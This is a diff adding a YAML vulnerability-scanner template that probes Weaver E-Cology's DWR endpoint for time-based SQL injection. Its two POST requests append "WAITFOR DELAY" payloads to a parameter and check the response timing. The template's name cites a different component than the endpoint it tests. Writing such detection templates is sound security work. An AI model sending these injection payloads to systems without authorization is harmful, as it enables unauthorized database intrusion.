@@ -1,0 +1,25 @@
+name: 泛微E-Cology-WorkflowServiceXml-SQL注入
+description: >
+  延时注入
+alwaysExecute: false
+timeout: 8
+matchCount: 2
+rules:
+  - method: POST
+    path: /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr
+    headers:
+      Content-Type: text/plain
+    body: >-
+      callCount=1&page=httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&batchId=0&c0-param1=string:1&c0-param0=string:1 WAITFOR DELAY '0:0:5'
+    expression:
+      sleep: 5
+      body_all: ["dwr.engine"]
+  - method: POST
+    path: /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr
+    headers:
+      Content-Type: text/plain
+    body: >-
+      callCount=1&page=httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&batchId=0&c0-param1=string:1&c0-param0=string:1 WAITFOR DELAY '0:0:4'
+    expression:
+      sleep: 4
+      body_all: ["dwr.engine"] 
